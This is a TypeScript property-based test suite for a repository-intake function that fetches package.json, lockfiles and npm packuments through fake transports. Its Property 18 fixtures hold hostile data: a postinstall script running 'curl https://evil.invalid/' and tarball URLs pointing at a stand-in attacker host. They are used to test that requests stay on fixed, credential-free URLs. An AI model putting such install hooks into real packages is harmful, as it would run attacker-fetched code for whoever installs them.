// intakeRepo. Spec: .kiro/specs/repo-intake, Requirements 5.10 to 5.13, 6.6, 6.7, 7, 8.9. No network.
import fc from "fast-check";
import { describe, expect, it } from "vitest";
import { CachedFetcher, MemoryCacheStore } from "../../src/cache.js";
import type { ClientContext } from "../../src/clients/context.js";
import { fetchRepoManifests, GITHUB_RAW_HOST, MAX_MANIFEST_BYTES } from "../../src/clients/github-raw.js";
import { NPM_REGISTRY, packumentUrl } from "../../src/clients/npm.js";
import type { Transport, TransportResponse } from "../../src/http.js";
import { intakeRepo, INTERNAL_ERROR_MESSAGE, MISSING_PACKAGE_JSON_MESSAGE } from "../../src/intake/intake.js";
import { applyCap } from "../../src/intake/cap.js";
import { parseManifests } from "../../src/intake/manifest.js";
import { isResolvableRange, UNRESOLVED_VERSION } from "../../src/intake/resolve.js";
import { scanMetadata } from "../../src/intake/scan.js";
import { INVALID_URL_MESSAGE, parseRepoUrl } from "../../src/intake/url.js";
import { isValidPackageName } from "../../src/intake/names.js";
import { scorePackages } from "../../src/score.js";
import { INTAKE_ERROR_CODES, type IntakeResult, type IntakeSuccess } from "../../src/types.js";
import {
  arbIntakeModel,
  arbIntakeTransport,
  arbOwner,
  arbPackageJson,
  arbRange,
  arbRepo,
  arbUpstreamBehaviour,
  arbValidName,
  arbVersion,
  renderLockfile,
  renderPackageJson,
  type IntakeBehaviours,
  type IntakeModel,
  type LockfileFormat,
  type MapEntries,
  type UpstreamBehaviour,
} from "../arbitraries.js";
import { limitedText, routedTextTransport, type RecordedRequest, type RouteTable } from "./routes.js";

const NOW = new Date("2026-11-12T00:00:00Z");
const URL_OR = "https://github.com/o/r";
const RAW_PKG = `${GITHUB_RAW_HOST}/o/r/HEAD/package.json`;
const RAW_LOCK = `${GITHUB_RAW_HOST}/o/r/HEAD/package-lock.json`;

function makeCtx(transport: Transport, store: MemoryCacheStore = new MemoryCacheStore()): ClientContext {
  const clock = () => NOW;
  return {
    transport,
    clock,
    cache: new CachedFetcher({ store, clock }),
    retry: { sleep: () => Promise.resolve(), maxRetries: 1 },
  };
}

function packument(versions: readonly string[]): string {
  return JSON.stringify({ versions: Object.fromEntries(versions.map((v) => [v, {}])) });
}

function manifestText(dependencies: Record<string, string>, devDependencies: Record<string, string> = {}): string {
  return JSON.stringify({ dependencies, devDependencies });
}

function run(routes: RouteTable, url = URL_OR) {
  const { transport, requests } = routedTextTransport(routes);
  return { requests, result: intakeRepo(url, makeCtx(transport)) };
}

function success(result: IntakeResult): IntakeSuccess {
  if (!result.ok) throw new Error(`expected success, got ${result.code}`);
  return result;
}

// ---- behaviour transport for Properties 14 and 15 ----

function respond(b: UpstreamBehaviour, canary: string): Promise<TransportResponse> {
  const jsonOf = (body: string) => () => new Promise<unknown>((resolve) => resolve(JSON.parse(body) as unknown));
  switch (b.kind) {
    case "ok":
      return Promise.resolve({ status: 200, json: jsonOf(b.body), text: (limit: number) => limitedText(b.body, limit) });
    case "not-found":
      return Promise.resolve({ status: 404, json: jsonOf("null") });
    case "server-error":
      return Promise.resolve({ status: 500, json: jsonOf("null") });
    case "rate-limited":
      return Promise.resolve({ status: 429, json: jsonOf("null") });
    case "throws-sync":
      throw new Error(canary);
    case "rejects-error":
      return Promise.reject(new Error(canary));
    case "rejects-non-error":
      return new Promise((_resolve, reject) => {
        reject(canary as unknown as Error);
      });
    case "text-rejects":
      return Promise.resolve({ status: 200, json: jsonOf("{}"), text: () => Promise.reject(new Error(canary)) });
    case "too-large":
      return Promise.resolve({ status: 200, json: jsonOf("{}"), text: () => Promise.resolve({ ok: false, reason: "too-large" }) });
    case "invalid-encoding":
      return Promise.resolve({ status: 200, json: jsonOf("{}"), text: () => Promise.resolve({ ok: false, reason: "invalid-encoding" }) });
    case "no-text":
      return Promise.resolve({ status: 200, json: jsonOf("{}") });
    case "nan-status":
      return Promise.resolve({ status: Number.NaN, json: jsonOf("{}"), text: (limit: number) => limitedText("{}", limit) });
  }
}

function behaviourTransport(b: IntakeBehaviours, canary: string): Transport {
  return (url) => {
    const behaviour = url.endsWith("/HEAD/package.json") ? b.pkg : url.endsWith("/HEAD/package-lock.json") ? b.lock : b.registry;
    return respond(behaviour, canary);
  };
}

const TEXT_TEMPLATES: readonly RegExp[] = [
  /^package(-lock)?\.json is larger than 5 MiB\.$/,
  /^package(-lock)?\.json could not be fetched( \(HTTP \d+\))?\.$/,
];
const FIXED_MESSAGES: readonly string[] = [
  INVALID_URL_MESSAGE,
  MISSING_PACKAGE_JSON_MESSAGE,
  INTERNAL_ERROR_MESSAGE,
  "package.json is not a valid manifest.",
  "package-lock.json is not a valid lockfile.",
];

function isFixedTemplate(message: string): boolean {
  return FIXED_MESSAGES.includes(message) || TEXT_TEMPLATES.some((re) => re.test(message));
}

const ERROR_KEYS = new Set(["ok", "code", "message", "file"]);

describe("Property 14: intakeRepo never rejects for any transport behaviour", () => {
  // Feature: repo-intake, Property 14: intakeRepo never rejects for any transport behaviour
  it("resolves with a result and a failure carries only error fields", async () => {
    const urlArb = fc.oneof(fc.constantFrom(URL_OR, "https://github.com/octocat/hello-world/tree/main"), fc.string());
    await fc.assert(
      fc.asyncProperty(urlArb, arbIntakeTransport, async (url, behaviours) => {
        const ctx = makeCtx(behaviourTransport(behaviours, "boom"));
        const result = await intakeRepo(url, ctx);
        if (!result.ok) {
          expect(INTAKE_ERROR_CODES).toContain(result.code);
          expect(result.message.length).toBeGreaterThan(0);
          for (const key of Object.keys(result)) expect(ERROR_KEYS.has(key)).toBe(true);
        }
      }),
      { numRuns: 100 },
    );
  });
});

describe("Property 15: Messages never echo input", () => {
  // Feature: repo-intake, Property 15: Messages never echo input
  it("a canary in the URL, bodies, names, ranges and thrown errors never reaches a message", async () => {
    const canaryArb = fc.stringMatching(/^[A-Za-z0-9]{12,20}$/);
    const scenario = canaryArb.chain((canary) => {
      const canaryBody: fc.Arbitrary<UpstreamBehaviour> = fc.constantFrom<UpstreamBehaviour>(
        { kind: "ok", body: `{"dependencies":"${canary}"}` },
        { kind: "ok", body: `${canary} is not json` },
        { kind: "ok", body: `{"dependencies":{"${canary}":"^1.0.0"}}` },
        { kind: "ok", body: `{"dependencies":{"a":"${canary}"}}` },
        { kind: "ok", body: `{"lockfileVersion":"${canary}"}` },
      );
      const behaviour = fc.oneof(arbUpstreamBehaviour, canaryBody);
      return fc.tuple(
        fc.constant(canary),
        fc.constantFrom(
          `https://github.com/${canary}/${canary}`,
          URL_OR,
          `https://evil.invalid/${canary}`,
          canary,
          `https://github.com/${canary}/${canary}/${canary}`,
        ),
        fc.record({ pkg: behaviour, lock: behaviour, registry: behaviour }),
      );
    });
    await fc.assert(
      fc.asyncProperty(scenario, async ([canary, url, behaviours]) => {
        const result = await intakeRepo(url, makeCtx(behaviourTransport(behaviours, canary)));
        if (!result.ok) {
          expect(result.message.includes(canary)).toBe(false);
          expect(isFixedTemplate(result.message)).toBe(true);
        }
      }),
      { numRuns: 1000 },
    );
  });
});

// ---- Property 16 ----

function modelRoutes(model: IntakeModel): RouteTable {
  const direct = model.dependencies.filter((d) => !d.dev);
  const dev = model.dependencies.filter((d) => d.dev);
  const toEntries = (list: typeof direct): MapEntries => list.map((d) => [d.name, d.range] as const);
  const pkgText = renderPackageJson({
    dependencies: toEntries(direct),
    devDependencies: toEntries(dev),
    peerDependencies: [],
    optionalDependencies: [],
    peerShape: "object",
  });
  const routes: Record<string, { status?: number; body?: string }> = { [RAW_PKG]: { body: pkgText } };
  if (model.lockfile !== null) {
    const entries: MapEntries = model.dependencies.flatMap((d) => (d.locked === null ? [] : [[d.name, d.locked] as const]));
    routes[RAW_LOCK] = { body: renderLockfile(model.lockfile, entries) };
  }
  for (const d of model.dependencies) {
    routes[packumentUrl(d.name)] =
      d.registry.kind === "versions" ? { body: packument(d.registry.versions) } : { status: d.registry.kind === "not-found" ? 404 : 500 };
  }
  return routes;
}

describe("Property 16: Unresolved and unlockedPackages invariants", () => {
  // Feature: repo-intake, Property 16: Unresolved and unlockedPackages invariants
  it("holds for any model of up to 320 dependencies", async () => {
    await fc.assert(
      fc.asyncProperty(arbIntakeModel, async (model) => {
        const { result } = run(modelRoutes(model));
        const ok = success(await result);
        const names = ok.packages.map((p) => p.name);
        expect(ok.unresolved).toEqual(ok.packages.filter((p) => p.resolution === "unresolved").map((p) => p.name));
        for (const name of ok.unresolved) {
          expect(ok.unlockedPackages).toContain(name);
          expect(names).toContain(name);
        }
        expect(ok.unlocked).toBe(ok.lockfileVersion === null);
        expect(ok.unlockedPackages).toEqual(ok.packages.filter((p) => p.resolution !== "locked").map((p) => p.name));
        for (const p of ok.packages) {
          expect(p.resolution === "unresolved").toBe(p.installedVersion === UNRESOLVED_VERSION);
          expect(typeof p.name).toBe("string");
          expect(typeof p.declaredRange).toBe("string");
          expect(["dependencies", "devDependencies"]).toContain(p.origin);
        }
        expect(ok.capped).toBe(ok.totalDirect > 300);
        expect(ok.packages.length).toBe(Math.min(ok.totalDirect, 300));
        const scan = scanMetadata(ok);
        expect(scan.capped).toBe(ok.totalDirect > 300);
        for (const name of scan.unresolved) expect(scan.unlockedPackages).toContain(name);
      }),
      { numRuns: 100 },
    );
  });
});

// ---- Property 18, intakeRepo arm ----

const HOSTILE_EXTRAS =
  '"repository":{"url":"https://evil.invalid/"},"scripts":{"postinstall":"curl https://evil.invalid/"},"bin":{"x":"https://evil.invalid/x"},"dist":{"tarball":"https://evil.invalid/x.tgz"}';
const HOSTILE_VERSION: fc.Arbitrary<string> = fc.oneof(
  arbVersion,
  fc.constantFrom("^1.0.0", "v1.0.0", "1.0.0+build", "https://evil.invalid/x", "latest", ""),
);

function hostileLockfile(format: LockfileFormat, entries: MapEntries): string {
  const body = (k: string, v: string) =>
    `${JSON.stringify(k)}:{"version":${JSON.stringify(v)},"resolved":"https://evil.invalid/x.tgz","tarball":"https://evil.invalid/x.tgz"}`;
  const packages = `{${['"":{"name":"root"}', ...entries.map(([k, v]) => body(`node_modules/${k}`, v))].join(",")}}`;
  const dependencies = `{${entries.map(([k, v]) => body(k, v)).join(",")}}`;
  if (format === 1) return `{"lockfileVersion":1,"dependencies":${dependencies}}`;
  if (format === 2) return `{"lockfileVersion":2,"packages":${packages},"dependencies":${dependencies}}`;
  return `{"lockfileVersion":3,"packages":${packages}}`;
}

describe("Property 18: Every outbound URL has the fixed prefix (intakeRepo arm)", () => {
  // Feature: repo-intake, Property 18: Every outbound URL has the fixed prefix
  it("requests only the two manifests and registry packuments of valid unlocked resolvable names", async () => {
    const scenario = fc.tuple(
      fc.oneof(arbOwner, fc.string({ maxLength: 8 })),
      fc.oneof(arbRepo, fc.string({ maxLength: 8 })),
      fc.boolean(),
      arbPackageJson(true),
      fc.array(fc.tuple(arbValidName, arbRange), { maxLength: 5 }),
      fc.constantFrom<LockfileFormat | null>(null, 1, 2, 3),
      fc.array(HOSTILE_VERSION, { minLength: 16, maxLength: 16 }),
    );
    await fc.assert(
      fc.asyncProperty(scenario, async ([owner, repo, gitSuffix, model, extraDeps, format, lockVersions]) => {
        const taken = new Set([...model.dependencies, ...model.devDependencies].map(([n]) => n));
        const extras: Array<readonly [string, string]> = [["https://evil.invalid/x", "*"], ["git+https://evil.invalid/x.git", "^1.0.0"]];
        for (const [name, range] of extraDeps) {
          if (!taken.has(name)) {
            taken.add(name);
            extras.push([name, range]);
          }
        }
        const pkgText = renderPackageJson({ ...model, devDependencies: [...model.devDependencies.filter(([n]) => !extras.some(([e]) => e === n)), ...extras] }, HOSTILE_EXTRAS);
        const directNames = [...new Set([...model.dependencies, ...model.devDependencies, ...extras].map(([n]) => n))].filter(isValidPackageName);
        const lockText =
          format === null ? null : hostileLockfile(format, directNames.map((n, i) => [n, lockVersions[i % lockVersions.length] ?? "1.0.0"] as const));

        const withGit = `${repo}${gitSuffix ? ".git" : ""}`;
        // The parser also accepts a trailing slash and /tree/{ref} tails, so it is the oracle for validity.
        const parsedUrl = parseRepoUrl(`https://github.com/${owner}/${withGit}`);
        const urlValid = parsedUrl.ok;
        const refOwner = parsedUrl.ok ? parsedUrl.repo.owner : owner;
        const refRepo = parsedUrl.ok ? parsedUrl.repo.repo : repo;
        const rawPkg = `${GITHUB_RAW_HOST}/${refOwner}/${refRepo}/HEAD/package.json`;
        const rawLock = `${GITHUB_RAW_HOST}/${refOwner}/${refRepo}/HEAD/package-lock.json`;

        const routes: Record<string, { body: string } | undefined> = { [rawPkg]: { body: pkgText } };
        if (lockText !== null) routes[rawLock] = { body: lockText };
        for (const name of directNames) {
          routes[packumentUrl(name)] = { body: '{"versions":{"1.0.0":{"dist":{"tarball":"https://evil.invalid/t.tgz"}}}}' };
        }
        const { transport, requests } = routedTextTransport(routes);
        const result = await intakeRepo(`https://github.com/${owner}/${withGit}`, makeCtx(transport));

        for (const r of requests) {
          expect(r.url.startsWith("https://raw.githubusercontent.com/") || r.url.startsWith("https://registry.npmjs.org/")).toBe(true);
          for (const header of Object.keys(r.headers)) expect(["authorization", "cookie"]).not.toContain(header.toLowerCase());
        }
        if (!urlValid) {
          expect(result.ok).toBe(false);
          expect(requests).toHaveLength(0);
          return;
        }
        expect(requests.filter((r) => r.url.startsWith(GITHUB_RAW_HOST)).map((r) => r.url)).toEqual([rawPkg, rawLock]);

        const parsed = parseManifests(pkgText, lockText);
        if (!parsed.ok) throw new Error("generated manifests must parse");
        const expected = applyCap(parsed.dependencies)
          .packages.filter((d) => d.lockedVersion === null && isValidPackageName(d.name) && isResolvableRange(d.declaredRange))
          .map((d) => packumentUrl(d.name))
          .sort();
        const registry = requests.filter((r) => r.url.startsWith(NPM_REGISTRY)).map((r) => r.url).sort();
        expect(registry).toEqual(expected);
      }),
      { numRuns: 1000 },
    );
  });
});

// ---- Examples ----

describe("error mapping and order (7.6 to 7.9)", () => {
  const TOO_BIG = new Uint8Array(MAX_MANIFEST_BYTES + 1);
  const BAD_UTF8 = new Uint8Array([0xff, 0xfe, 0xfd]);
  const GOOD_PKG = { body: "{}" };

  const rows: ReadonlyArray<readonly [string, RouteTable, string, string, string | undefined]> = [
    ["package.json 404", {}, "missing-package-json", MISSING_PACKAGE_JSON_MESSAGE, "package.json"],
    ["package.json too large", { [RAW_PKG]: { body: TOO_BIG } }, "manifest-too-large", "package.json is larger than 5 MiB.", "package.json"],
    ["package.json HTTP 500", { [RAW_PKG]: { status: 500 } }, "fetch-failed", "package.json could not be fetched (HTTP 500).", "package.json"],
    ["package.json 429 forever", { [RAW_PKG]: { status: 429 } }, "fetch-failed", "package.json could not be fetched (HTTP 429).", "package.json"],
    ["package.json transport throws", { [RAW_PKG]: { throws: new Error("secret") } }, "fetch-failed", "package.json could not be fetched.", "package.json"],
    ["package.json invalid UTF-8", { [RAW_PKG]: { body: BAD_UTF8 } }, "fetch-failed", "package.json could not be fetched.", "package.json"],
    ["package.json transport without text", { [RAW_PKG]: { body: "{}", noText: true } }, "fetch-failed", "package.json could not be fetched.", "package.json"],
    ["package.json not JSON", { [RAW_PKG]: { body: "nope" } }, "invalid-package-json", "package.json is not a valid manifest.", "package.json"],
    ["package.json invalid dependency map", { [RAW_PKG]: { body: '{"dependencies":[]}' } }, "invalid-package-json", "package.json is not a valid manifest.", "package.json"],
    ["lockfile too large", { [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { body: TOO_BIG } }, "manifest-too-large", "package-lock.json is larger than 5 MiB.", "package-lock.json"],
    ["lockfile HTTP 500", { [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { status: 500 } }, "fetch-failed", "package-lock.json could not be fetched (HTTP 500).", "package-lock.json"],
    ["lockfile transport throws", { [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { throws: "x" } }, "fetch-failed", "package-lock.json could not be fetched.", "package-lock.json"],
    ["lockfile not JSON", { [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { body: "nope" } }, "invalid-lockfile", "package-lock.json is not a valid lockfile.", "package-lock.json"],
    ["lockfile bad version", { [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { body: '{"lockfileVersion":4}' } }, "invalid-lockfile", "package-lock.json is not a valid lockfile.", "package-lock.json"],
  ];

  it.each(rows)("%s", async (_label, routes, code, message, file) => {
    const { result } = run(routes);
    const value = await result;
    expect(value).toEqual({ ok: false, code, message, file });
    expect("packages" in value).toBe(false);
    expect("scan" in value).toBe(false);
  });

  it("invalid URL gives invalid-url with no file and no request", async () => {
    const { result, requests } = run({}, "http://github.com/o/r");
    expect(await result).toEqual({ ok: false, code: "invalid-url", message: INVALID_URL_MESSAGE });
    expect(requests).toHaveLength(0);
  });

  it("an unexpected exception gives internal-error and does not reject", async () => {
    const { transport } = routedTextTransport({});
    const value = await intakeRepo(undefined as unknown as string, makeCtx(transport));
    expect(value).toEqual({ ok: false, code: "internal-error", message: INTERNAL_ERROR_MESSAGE });
  });

  it("requests in order: package.json, then the lockfile, then registry packuments", async () => {
    const { result, requests } = run({ [RAW_PKG]: { body: manifestText({ a: "^1.0.0" }) }, [packumentUrl("a")]: { body: packument(["1.0.0"]) } });
    success(await result);
    expect(requests.map((r) => r.url)).toEqual([RAW_PKG, RAW_LOCK, packumentUrl("a")]);
  });

  it("an invalid package.json makes no lockfile request", async () => {
    const { result, requests } = run({ [RAW_PKG]: { body: "nope" }, [RAW_LOCK]: { body: "{}" } });
    await result;
    expect(requests.map((r) => r.url)).toEqual([RAW_PKG]);
  });

  it("a lockfile 500 is an error, not an unlocked scan", async () => {
    const { result } = run({ [RAW_PKG]: GOOD_PKG, [RAW_LOCK]: { status: 500 } });
    const value = await result;
    expect(value.ok).toBe(false);
  });

  it("a lockfile 404 gives unlocked true", async () => {
    const { result } = run({ [RAW_PKG]: { body: manifestText({ a: "^1.0.0" }) }, [packumentUrl("a")]: { body: packument(["1.2.3"]) } });
    const ok = success(await result);
    expect(ok.unlocked).toBe(true);
    expect(ok.lockfileVersion).toBeNull();
    expect(ok.unlockedPackages).toEqual(["a"]);
    expect(ok.packages).toEqual([{ name: "a", installedVersion: "1.2.3", declaredRange: "^1.0.0", origin: "dependencies", resolution: "unlocked" }]);
  });

  it("a lockfile gives locked versions and no registry request", async () => {
    const lock = renderLockfile(3, [["a", "1.5.0"]]);
    const { result, requests } = run({ [RAW_PKG]: { body: manifestText({ a: "^1.0.0" }) }, [RAW_LOCK]: { body: lock } });
    const ok = success(await result);
    expect(ok.unlocked).toBe(false);
    expect(ok.lockfileVersion).toBe(3);
    expect(ok.packages[0]).toMatchObject({ installedVersion: "1.5.0", resolution: "locked" });
    expect(requests.map((r) => r.url)).toEqual([RAW_PKG, RAW_LOCK]);
  });
});

describe("7.12 to 7.14", () => {
  it("7.12: the missing-package-json message names package.json and says the repository may be private", async () => {
    const value = await run({}).result;
    expect(value.ok ? "" : value.message).toContain("package.json");
    expect(value.ok ? "" : value.message).toContain("may not exist or may be private");
  });

  it("7.13: no dependencies gives an empty success", async () => {
    const ok = success(await run({ [RAW_PKG]: { body: "{}" } }).result);
    expect(ok.packages).toEqual([]);
    expect(ok.capped).toBe(false);
    expect(ok.totalDirect).toBe(0);
  });

  it("7.14: two calls with the same fixtures, cache and clock are deeply equal", async () => {
    const routes: RouteTable = {
      [RAW_PKG]: { body: manifestText({ a: "^1.0.0", b: "latest" }, { c: "~2.0.0" }) },
      [packumentUrl("a")]: { body: packument(["1.0.0", "1.1.0"]) },
      [packumentUrl("c")]: { status: 500 },
    };
    const { transport } = routedTextTransport(routes);
    const ctx = makeCtx(transport);
    const first = await intakeRepo(URL_OR, ctx);
    const second = await intakeRepo(URL_OR, ctx);
    expect(second).toEqual(first);
    const fresh = await intakeRepo(URL_OR, makeCtx(routedTextTransport(routes).transport));
    expect(fresh).toEqual(first);
  });
});

describe("Unlocked resolution (5.10 to 5.13)", () => {
  it("5.10: requests the packument URL and never a tarball", async () => {
    const tarball = "https://registry.npmjs.org/a/-/a-1.0.0.tgz";
    const body = JSON.stringify({ versions: { "1.0.0": { dist: { tarball } } } });
    const { result, requests } = run({ [RAW_PKG]: { body: manifestText({ a: "^1.0.0", "@s/b": "^1.0.0" }) }, [packumentUrl("a")]: { body }, [packumentUrl("@s/b")]: { body } });
    success(await result);
    const registry = requests.filter((r) => r.url.startsWith(NPM_REGISTRY)).map((r) => r.url);
    expect(registry.sort()).toEqual([packumentUrl("@s/b"), packumentUrl("a")].sort());
    expect(requests.some((r) => r.url.includes(".tgz"))).toBe(false);
  });

  it.each([
    ["HTTP 500", { status: 500 }],
    ["a body that is not an object", { body: "[1]" }],
    ["a string body", { body: '"x"' }],
    ["a packument with no versions", { body: "{}" }],
    ["versions that is not an object", { body: '{"versions":[]}' }],
    ["a transport that throws", { throws: new Error("x") }],
  ])("5.12: %s gives unresolved and leaves other packages unchanged", async (_label, behaviour) => {
    const { result } = run({
      [RAW_PKG]: { body: manifestText({ a: "^1.0.0", b: "^1.0.0" }) },
      [packumentUrl("a")]: behaviour,
      [packumentUrl("b")]: { body: packument(["1.4.0"]) },
    });
    const ok = success(await result);
    expect(ok.packages.map((p) => [p.name, p.installedVersion, p.resolution])).toEqual([
      ["a", UNRESOLVED_VERSION, "unresolved"],
      ["b", "1.4.0", "unlocked"],
    ]);
    expect(ok.unresolved).toEqual(["a"]);
    expect(ok.unlockedPackages).toEqual(["a", "b"]);
  });

  it("5.12: unresolvable ranges make no registry request", async () => {
    const deps = { a: "latest", b: "git+https://example.invalid/x.git", c: "file:../x", d: "workspace:*", e: "npm:other@1", f: "^".padEnd(300, "1") };
    const { result, requests } = run({ [RAW_PKG]: { body: manifestText(deps) } });
    const ok = success(await result);
    expect(requests.filter((r) => r.url.startsWith(NPM_REGISTRY))).toHaveLength(0);
    expect(ok.unresolved).toEqual(["a", "b", "c", "d", "e", "f"]);
  });

  it("5.13: reverse completion order gives the same versions with at most 8 packument requests in flight", async () => {
    const names = Array.from({ length: 20 }, (_, i) => `d-${i.toString().padStart(2, "0")}`);
    const routes: Record<string, { body: string; delayMs?: number }> = { [RAW_PKG]: { body: manifestText(Object.fromEntries(names.map((n) => [n, "^1.0.0"]))) } };
    names.forEach((n, i) => {
      routes[packumentUrl(n)] = { body: packument([`1.${i.toString()}.0`, "1.0.0"]), delayMs: (20 - i) * 3 };
    });
    const inner = routedTextTransport(routes);
    let inflight = 0;
    let peak = 0;
    const transport: Transport = async (url, request) => {
      const counted = url.startsWith(NPM_REGISTRY);
      if (counted) {
        inflight++;
        peak = Math.max(peak, inflight);
      }
      try {
        return await inner.transport(url, request);
      } finally {
        if (counted) inflight--;
      }
    };
    const ok = success(await intakeRepo(URL_OR, makeCtx(transport)));
    expect(ok.packages.map((p) => p.installedVersion)).toEqual(names.map((_, i) => `1.${i.toString()}.0`));
    expect(peak).toBeLessThanOrEqual(8);
    expect(peak).toBeGreaterThan(1);
  });

  it("5.11: a cache store shared with scorePackages gives zero full-packument re-fetches", async () => {
    const names = ["a", "b", "@s/c"];
    const routes: Record<string, { body: string }> = { [RAW_PKG]: { body: manifestText(Object.fromEntries(names.map((n) => [n, "^1.0.0"]))) } };
    for (const n of names) routes[packumentUrl(n)] = { body: packument(["1.0.0"]) };
    const { transport, requests } = routedTextTransport(routes);
    const store = new MemoryCacheStore();
    const ok = success(await intakeRepo(URL_OR, makeCtx(transport, store)));
    const packumentUrls = new Set(names.map((n) => packumentUrl(n)));
    const isFull = (r: RecordedRequest) => packumentUrls.has(r.url) && r.headers["Accept"] === "application/json";
    expect(requests.filter(isFull)).toHaveLength(3);
    const before = requests.length;
    await scorePackages(ok.packages, { transport, clock: () => NOW, cacheStore: store, retry: { sleep: () => Promise.resolve(), maxRetries: 1 } });
    expect(requests.slice(before).filter(isFull)).toHaveLength(0);
  });
});

describe("Cap (6.6, 6.7)", () => {
  it("305 unlocked dependencies request 300 packuments and drop five devDependencies", async () => {
    const pad = (i: number) => i.toString().padStart(3, "0");
    const deps = Object.fromEntries(Array.from({ length: 250 }, (_, i) => [`dep-${pad(i)}`, "^1.0.0"]));
    const devNames = Array.from({ length: 55 }, (_, i) => `dev-${pad(i)}`);
    const dev = Object.fromEntries(devNames.map((n) => [n, "^1.0.0"]));
    const routes: Record<string, { body: string }> = { [RAW_PKG]: { body: manifestText(deps, dev) } };
    for (const n of [...Object.keys(deps), ...devNames]) routes[packumentUrl(n)] = { body: packument(["1.0.0"]) };
    const { result, requests } = run(routes);
    const ok = success(await result);
    const registry = requests.filter((r) => r.url.startsWith(NPM_REGISTRY)).map((r) => r.url);
    expect(registry).toHaveLength(300);
    expect(ok.capped).toBe(true);
    expect(ok.totalDirect).toBe(305);
    expect(ok.packages).toHaveLength(300);
    const dropped = devNames.slice(-5);
    for (const n of dropped) expect(registry).not.toContain(packumentUrl(n));
    expect(ok.packages.filter((p) => p.origin === "devDependencies")).toHaveLength(50);
  });
});

describe("fetchRepoManifests and intakeRepo request the same URLs", () => {
  const cases: ReadonlyArray<readonly [string, RouteTable]> = [
    ["package.json and lockfile", { [RAW_PKG]: { body: manifestText({ a: "1.0.0" }) }, [RAW_LOCK]: { body: renderLockfile(3, [["a", "1.0.0"]]) } }],
    ["no lockfile and no dependencies", { [RAW_PKG]: { body: "{}" } }],
    ["package.json missing", {}],
    ["package.json invalid", { [RAW_PKG]: { body: "nope" } }],
  ];
  it.each(cases)("%s", async (_label, routes) => {
    const a = routedTextTransport(routes);
    const b = routedTextTransport(routes);
    const parsed = parseRepoUrl(URL_OR);
    if (!parsed.ok) throw new Error("url must parse");
    await fetchRepoManifests(makeCtx(a.transport), parsed.repo);
    await intakeRepo(URL_OR, makeCtx(b.transport));
    const rawOnly = (list: readonly RecordedRequest[]) => list.map((r) => r.url).filter((u) => u.startsWith(GITHUB_RAW_HOST));
    expect(rawOnly(b.requests)).toEqual(rawOnly(a.requests));
  });
});
